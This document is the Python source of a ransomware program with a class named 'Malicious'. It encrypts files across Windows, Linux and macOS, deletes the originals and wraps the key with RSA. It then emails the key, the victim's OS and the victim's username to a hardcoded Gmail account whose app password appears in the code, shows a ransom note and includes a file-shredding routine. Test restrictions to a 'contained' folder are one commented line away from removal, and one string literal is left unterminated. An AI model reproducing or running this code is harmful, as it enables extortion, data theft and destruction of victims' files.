import os
import socket
import cryptography.fernet
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from cryptography.fernet import Fernet
from email.message import EmailMessage
import smtplib
import platform
import requests  # Checking Internet Connectivity
from functools import lru_cache
from string import ascii_uppercase as drives


class Malicious:
    def __init__(self):
        self.cipher_object = None
        self.key = None
        self.extensions = ["txt"] # ["mp3", "rst", "png", "txt", "pdf", "jpg", "mp4", "mkv", "zip", "docx", "ppt", "xls", "db", "doc", "tar", "gz"] # Uncomment to Encrypt Files with These Entensions
        self.__public_key = RSA.import_key(open("public.pem", "rb").read())
        self.enc_key = "symmetric_key.pem"
        self.file_system = None
        self.mail = "decryptfiles4@gmail.com"  # Change This to your Email .Its also accessed  in ransomNote
        self.ml_pswd = "fjbfxxtcexvudupu"  # Change This [App Password Google app password for more information] https://knowledge.workspace.google.com/kb/how-to-create-app-passwords-000009237
        self.server = None

    # Generation of symmetric Key
    def generate_key(self):
        self.key = Fernet.generate_key()
        with open(self.enc_key, "wb") as sym_key:
            sym_key.write(self.key)
        # print("Symmetric Key Generated & Saved to file\n", self.key) [Debugging Lines]

    @lru_cache(4048)
    def __scramble(self, filepath, root=None, encrypted=False):
        # Fetching the Key for encryption purposes
        with open(self.enc_key, "rb") as symmetric_key:
            self.key = symmetric_key.read()
            self.cipher_object = Fernet(self.key)

        # Encryption Process

        with open(filepath, "rb") as data_file:
            data = data_file.read()

        if not encrypted:
            __data = self.cipher_object.encrypt(data)
            print(f"{filepath.split('/')[-1]} Encrypted Successfully.")

        else:
            __data = self.cipher_object.decrypt(data)
            print(f"{filepath.split('/')[-1]} Decrypted Successfully.")

        # Writing Saved Changes
        with open(filepath+".404Crypt", "wb") as file:
            file.write(__data)

        os.remove(filepath)

    def crypt(self):
        operating_system = platform.system().lower()

        if operating_system == "linux":
            self.file_system = os.walk(self.linux, topdown=True)
            self.fs_navigator(file_system=self.file_system)

        elif operating_system == "windows":
            partitions = self.windows
            for partition in partitions:
                self.file_system = os.walk(partition, topdown=True)
                self.fs_navigator(file_system=self.file_system)

        elif operating_system == "darwin":
            self.file_system = os.walk(self.macos, topdown=True)
            self.fs_navigator(file_system=self.file_system)

        else:
            pass

    @lru_cache(4048)
    def fs_navigator(self, file_system,  encrypted=False):
        for root, dr, files in file_system:
            for file in files:
                # Obtaining Paths to @ file Iterated
                file_path = os.path.join(root, file)
                if file.split(".")[-1] in self.extensions:
                    if not encrypted:
                        try:
                            self.__scramble(file_path)
                        except ValueError as e:
                            print("Key is Encrypted")
                            self.display_ransom_note()
                            exit()
                    else:
                        self.__scramble(root, file_path, encrypted=True)

    @property
    def windows(self):
        # The C: Partitions Should start from C:\\Windows\Users Not C: To prevent Encryption of OS Files
        partitions = [drive + ":" for drive in drives]
        partitions[2] = r"C:\\Windows\Users"  # To prevent Encryption of OS Files
        valid_partitions = []
        for partition in partitions:
            if os.path.isdir(partition):
                valid_partitions.append(partition)
        valid_partitions = ["contained"] # Change this to a Directory u want for Testing if To Encrypt Entire System Comment the Line
        return valid_partitions

    @property
    def linux(self):
        path = "~/../
        path = "contained"  # Comment This Line To Encrypt from /home in linux
        # login = os.getlogin()
        # path = os.path.join(home, login)
        return path

    @property
    def macos(self):
        home = "/Users"
        login = os.getlogin()
        path = os.path.join(home, login)
        return path

    # Encrypt Symmetric Key Method
    @lru_cache(4048)
    def encrypt_symmetric_key(self):
        with open(self.enc_key, "rb") as sym_key:
            self.key = sym_key.read()

        # Encrypting AES key using RSA
        try:
            public_crypter = PKCS1_OAEP.new(self.__public_key)
            encrypted_key = public_crypter.encrypt(self.key)
        except ValueError as e:
            print("Key is Encrypted")
            self.display_ransom_note()
            exit()

        with open(self.enc_key, "wb") as sym_key_encrypter:
            sym_key_encrypter.write(encrypted_key)
            # print("[+] Key Encrypter Successfully [+]") [Debugging]
            print("[+] Emailing Key.... [+]")
            self.send_mail()

    def send_mail(self):
        try:
            self.server = smtplib.SMTP("smtp.gmail.com", 587)
            self.server.starttls()
        except socket.gaierror as e:
            pass
        if self.check_internet:
            # System Info
            os_system = platform.system()
            logged_user = os.getlogin()

            # mail msg Body
            message = EmailMessage()
            message["From"] = self.mail
            message["To"] = self.mail
            message["Subject"] = "Encrypted Key for OS: {} USER: {}".format(os_system, logged_user)

            with open(self.enc_key, "rb") as file:
                message.add_attachment(
                    file.read(),
                    maintype="application",
                    subtype="octet-stream",
                    filename=file.name
                )
            self.server.login(self.mail, self.ml_pswd)
            self.server.send_message(msg=message)
        else:
            print("No Internet")  # No internet Connection On target Machine

    @property
    def check_internet(self):  # Checks Internet Connectivity on Machine
        try:
            resp = requests.get("https://www.google.com", timeout=4)
            if resp.status_code == 200:
                return True
        except (requests.ConnectionError, requests.Timeout) as exception:
            return False

    @lru_cache(4048)
    def display_ransom_note(self):
        # Lazy Import Due to Circular Import Errors
        from Ransom_Note import Note
        r_note = Note()
        r_note.mainloop()

    # Checking if Key is On Desktop
    @lru_cache(4048)
    def key_on_desktop(self):
        operating_system = platform.system().lower()

        if operating_system == "windows":
            path = r"C:\\Windows\Users"
            for root, dr, files in os.walk(path, topdown=True):
                for file in files:
                    file_path = file_path = os.path.join(root, file)
                    if file == self.enc_key and "desktop" in file_path.lower():
                        return file_path

        elif operating_system == "linux":
            paths = ["/home/", "/root"]
            for path in paths:
                for root, dr, files in os.walk(path, topdown=True):
                    for file in files:
                        file_path = os.path.join(root, file)
                        if file == self.enc_key and "desktop" in file_path.lower():
                            return file_path

        elif operating_system == "darwin":
            path = "/Users"
            for root, dr, files in os.walk(path, topdown=True):
                for file in files:
                    file_path = os.path.join(root, file)
                    if file == self.enc_key and "desktop" in file_path.lower():
                        return file_path

        else:
            pass

    def change_desktop_bg(self):
        pass

    # System Shred Needs Modification
    def shred_system(self):
        # Perform an OS Detection before Deletion
        operating_system = platform.system().lower()

        if operating_system == "linux":
            self.file_system = os.walk(self.linux, topdown=True)
            self.shred_navigator(file_system=self.file_system)
        elif operating_system == "windows":
            partitions = self.windows
            for partition in partitions:
                self.file_system = os.walk(partition, topdown=True)
                self.shred_navigator(file_system=self.file_system)
        elif operating_system == "darwin":
            self.file_system = os.walk(self.macos, topdown=True)
            self.shred_navigator(file_system=self.file_system)
        else:
            pass

    def shred_navigator(self, file_system):
        for root, dr, files in file_system:
            for file in files:
                file_path = os.path.join(root, file)
                if file.split(".")[-1] in self.extensions:
                    try:
                        os.remove(file_path)
                    except Exception:
                        pass
                else:
                    pass


@lru_cache(4048)
def main():
    malware = Malicious()
    # malware.generate_key() # Once Uncommented When Program Run It Encrypts With a Diff Key
    malware.crypt()  # More CPU Needed
    malware.encrypt_symmetric_key()
    malware.display_ransom_note()
    malware.change_desktop_bg()


if __name__ == "__main__":
    main()
